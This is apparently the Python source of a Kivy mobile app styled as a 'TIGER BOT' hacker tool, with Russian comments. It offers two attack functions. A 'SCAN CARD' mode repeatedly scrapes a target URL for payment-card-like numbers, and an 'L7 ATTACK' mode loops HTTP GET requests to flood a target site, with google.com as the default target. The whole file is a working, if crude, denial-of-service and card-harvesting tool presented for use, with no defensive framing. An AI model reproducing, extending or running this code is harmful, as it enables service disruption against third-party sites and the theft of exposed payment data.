import threading
import socket
import random
import time
import re
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock
from kivy.core.window import Window

# --- НАСТРОЙКИ ЦВЕТОВ (HACKER STYLE) ---
Window.clearcolor = (0.1, 0.1, 0.1, 1)  # Темно-серый фон
C_GREEN = (0, 1, 0, 1)
C_RED = (1, 0, 0, 1)
C_BTN = (0.2, 0.2, 0.2, 1)

class TigerApp(App):
    def build(self):
        self.is_running = False
        self.stats = {'req': 0, 'found': 0}
        
        # ГЛАВНЫЙ КОНТЕЙНЕР
        layout = BoxLayout(orientation='vertical', padding=15, spacing=10)
        
        # ЗАГОЛОВОК
        title = Label(text='[b]TIGER BOT v.13 iOS[/b]', markup=True, font_size=24, color=C_GREEN, size_hint=(1, 0.1))
        layout.add_widget(title)
        
        # ПОЛЕ ЦЕЛИ (TARGET)
        self.target_input = TextInput(text='https://google.com', multiline=False, size_hint=(1, 0.1), 
                                      background_color=(0.3, 0.3, 0.3, 1), foreground_color=(1,1,1,1), hint_text="Target URL")
        layout.add_widget(self.target_input)
        
        # КНОПКИ УПРАВЛЕНИЯ
        btn_layout = BoxLayout(size_hint=(1, 0.15), spacing=10)
        
        self.btn_scan = Button(text='SCAN CARD', background_color=C_BTN, color=C_GREEN)
        self.btn_scan.bind(on_press=self.start_scanner)
        
        self.btn_ddos = Button(text='L7 ATTACK', background_color=C_BTN, color=C_RED)
        self.btn_ddos.bind(on_press=self.start_ddos)
        
        self.btn_stop = Button(text='STOP', background_color=(0.5, 0, 0, 1))
        self.btn_stop.bind(on_press=self.stop_all)
        
        btn_layout.add_widget(self.btn_scan)
        btn_layout.add_widget(self.btn_ddos)
        btn_layout.add_widget(self.btn_stop)
        layout.add_widget(btn_layout)
        
        # ОКНО ЛОГОВ (Вместо консоли)
        self.log_label = Label(text='Waiting for command...', size_hint_y=None, markup=True, halign='left', valign='top')
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        
        scroll = ScrollView(size_hint=(1, 0.6))
        scroll.add_widget(self.log_label)
        layout.add_widget(scroll)
        
        # СТАТИСТИКА
        self.stat_label = Label(text='REQ: 0 | FOUND: 0', size_hint=(1, 0.05), color=(1, 1, 0, 1))
        layout.add_widget(self.stat_label)
        
        return layout

    # --- ЛОГИКА ---
    def log(self, msg):
        # Обновление текста безопасно для GUI
        Clock.schedule_once(lambda dt: self._update_log(msg))

    def _update_log(self, msg):
        self.log_label.text = msg + "\n" + self.log_label.text[:1000] # Держим последние 1000 символов

    def update_stats(self, dt):
        self.stat_label.text = f"REQ: {self.stats['req']} | FOUND: {self.stats['found']}"

    def stop_all(self, instance):
        self.is_running = False
        self.log(f"[color=ff0000][!] STOPPING...[/color]")

    def start_scanner(self, instance):
        if self.is_running: return
        self.is_running = True
        threading.Thread(target=self.scanner_thread).start()
        Clock.schedule_interval(self.update_stats, 1)

    def start_ddos(self, instance):
        if self.is_running: return
        self.is_running = True
        threading.Thread(target=self.ddos_thread).start()
        Clock.schedule_interval(self.update_stats, 1)

    # --- ПОТОКИ АТАКИ ---
    def scanner_thread(self):
        target = self.target_input.text
        self.log(f"[color=00ff00][*] SCANNING: {target}[/color]")
        card_pattern = re.compile(r'\b(?:\d[ -]*?){13,19}\b')
        
        while self.is_running:
            try:
                r = requests.get(target, timeout=5)
                if r.status_code == 200:
                    cards = card_pattern.findall(r.text)
                    for c in cards:
                        self.log(f"[b][color=00ff00]FOUND: {c}[/color][/b]")
                        self.stats['found'] += 1
                self.stats['req'] += 1
            except Exception as e:
                pass
            time.sleep(0.5)

    def ddos_thread(self):
        target = self.target_input.text
        self.log(f"[color=ff0000][*] L7 ATTACK: {target}[/color]")
        while self.is_running:
            try:
                requests.get(target, timeout=2)
                self.stats['req'] += 1
            except: pass

if __name__ == '__main__':
    TigerApp().run()
